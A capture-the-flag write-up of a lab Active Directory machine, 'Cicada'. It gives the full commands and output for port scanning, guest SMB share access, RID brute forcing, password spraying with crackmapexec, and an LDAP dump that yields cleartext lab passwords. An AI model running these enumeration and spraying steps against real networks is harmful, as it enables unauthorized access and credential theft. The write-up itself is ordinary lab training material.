RECON
--
Started Of With Doing a Port Scan  
**nmap $ip -p- -T5 -Pn || rustscan --ulimit 5000 $ip -- -sC -sV -Pn**  
This Returned Me 

    |-53/tcp   open  domain        syn-ack Simple DNS Plus
    |-
    |-88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-09-29 11:34:33Z)
    |-
    |-135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
    |-
    |-139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
    |-
    |-389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
    |-ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
    |-Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
    |-Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
    |-Public Key type: rsa
    |-Public Key bits: 2048
    |-Signature Algorithm: sha256WithRSAEncryption
    |-Not valid before: 2024-08-22T20:24:16
    |-Not valid after:  2025-08-22T20:24:16
    |-MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
    |-SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
    | 
    |-ssl-date: TLS randomness does not represent time
    | 
    |-445/tcp  open  microsoft-ds? syn-ack
    |
    |-464/tcp  open  kpasswd5?     syn-ack
    |
    |-593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
    |
    |-636/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
    |-ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
    |-Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
    |-Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
    |-Public Key type: rsa
    |-Public Key bits: 2048
    |-Signature Algorithm: sha256WithRSAEncryption
    |-Not valid before: 2024-08-22T20:24:16
    |-Not valid after:  2025-08-22T20:24:16
    |-MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
    |-SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
    |
    |-ssl-date: TLS randomness does not represent time
    |-3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
    |-ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
    |-Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
    |-Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
    |-Public Key type: rsa
    |-Public Key bits: 2048
    |-Signature Algorithm: sha256WithRSAEncryption
    |-Not valid before: 2024-08-22T20:24:16
    |-Not valid after:  2025-08-22T20:24:16
    |-MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
    |-SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
    |
    |-ssl-date: TLS randomness does not represent time
    |
    |-3269/tcp open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
    |-ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
    |-Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
    |-Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
    |-Public Key type: rsa
    |-Public Key bits: 2048
    |-Signature Algorithm: sha256WithRSAEncryption
    |-Not valid before: 2024-08-22T20:24:16
    |-Not valid after:  2025-08-22T20:24:16
    |-MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
    |-SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
    |
    |-ssl-date: TLS randomness does not represent time
    |Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows
    |
    |-Host script results:
    |-p2p-conficker: 
    |---Checking for Conficker.C or higher...
    |---Check 1 (port 43674/tcp): CLEAN (Timeout)
    |---Check 2 (port 14644/tcp): CLEAN (Timeout)
    |---Check 3 (port 62917/udp): CLEAN (Timeout)
    |---Check 4 (port 13628/udp): CLEAN (Timeout)
    |---0/4 checks are positive: Host is CLEAN or ports are blocked
    |-smb2-security-mode: 
    |----3:1:1: 
    |-----Message signing enabled and required
    |-smb2-time: 
    |---date: 2024-09-29T11:35:22
    |---start_date: N/A
    |-clock-skew: 6h59m59s   

From the Output i could tell this was a Domain Controller inside an active directory enviroment  
There was no website which was weird too see for once  

So As Usual i prioritized SMB first so i did some digging into it  

**smbclient -L \\$ip\\**

    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    C$              Disk      Default share
    DEV             Disk      
    HR              Disk      
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share 
    SYSVOL          Disk      Logon server share
Ouput Showed the usual windows shares but HR and DEV were interesting so i started digging more into them  

**smbmap -H $ip -u "guest" -p " "**

    ADMIN$          NO ACCESS       Remote Admin
    C$              NO ACCESS       Default share
    DEV             NO ACCESS
    HR              READ ONLY
    IPC$            READ ONLY       Remote IPC
    NETLOGON        NO ACCESS       Logon server share 
    SYSVOL          NO ACCESS       Logon server share 
i had access to HR through a NULL session, after connecting to it i find one file "Notice from HR.txt"  
Inside this i found a password "Cicada$M6Corpb*@Lp#nZp!8"

From Here i wasnt too sure what i could do since i had no usernames, so finding some usernames was my next goal  
so i tried using kerbrute using some seclists wordlists  

**kerbrute userenum --dc $ip -d cicada.htb <wordlist>**
this returned me nothing other then "administrator" and "guest" which i already knew

so i went to my notes on attacking AD and decided to try RID Brute Forcing with crackmapexec  
**crackmapexec smb $ip -u "guest" -p "" --rid-brute**

        [...snip]
        SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
        SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
        SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
        SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
        SMB         10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
        SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
        [...snip]
and finally i had a list of usernames i could use  
now i can try some password spraying  

**crackmapexec smb $ip -u users.txt -p 'Cicada$M6Corpb\*@Lp#nZp!8' --continue-on-success**

        SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
        SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
        SMB         10.10.11.35     445    CICADA-DC        [YEP] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
        SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
        SMB         10.10.11.35     445    CICADA-DC        [YEP] cicada.htb\Dev:Cicada$M6Corpb*@Lp#nZp!8 
        SMB         10.10.11.35     445    CICADA-DC        [-] cicada.htb\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 

Now i had a username to go with the Password, Dev and michael.wrightson  
tho i couldnt login to smb for whatever reason with the creds, i was stuck here for a while  
then finally i decided to try out the creds with ldap, and they worked!

now i could of used LdapSearch but that would take a while to parse through and check out the data so i just used ldapdomaindump
**ldapdomaindump $ip  -u "cicada.htb\michael.wrightson" -p 'Cicada$M6Corpb\*@Lp#nZp!8'**

from this it gave me a bunch of data, but i focused on the domain_users.html file which i hosted with python to view  
![image](https://github.com/user-attachments/assets/681402cc-012e-4276-a140-e114888b65bf)

and this gave me the password for the user "emily.carlos"

         emily.carlos : Q!3@Lp#M6b*7t*Vt
